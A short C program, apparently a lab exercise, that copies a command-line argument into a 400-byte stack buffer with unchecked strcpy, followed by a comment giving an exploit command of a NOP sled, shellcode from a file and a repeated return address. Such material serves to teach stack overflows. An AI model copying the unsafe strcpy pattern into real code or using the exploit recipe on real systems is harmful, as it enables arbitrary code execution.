#include <stdio.h>
#include <string.h>


void greeting( char* temp1 )
{
	char name[400];
	memset(name, 0, 400);
	strcpy(name, temp1);
	printf( "Hi %s \n", name );
}


int main(int argc, char* argv[] ) 
{
	greeting( argv[1] );
	printf( "Bye %s\n", argv[1] );
}

// ./meet `perl -e 'print "\x90"x201';``cat sc``perl -e 'print"\xf8\xf2\xff\xbf"x38';`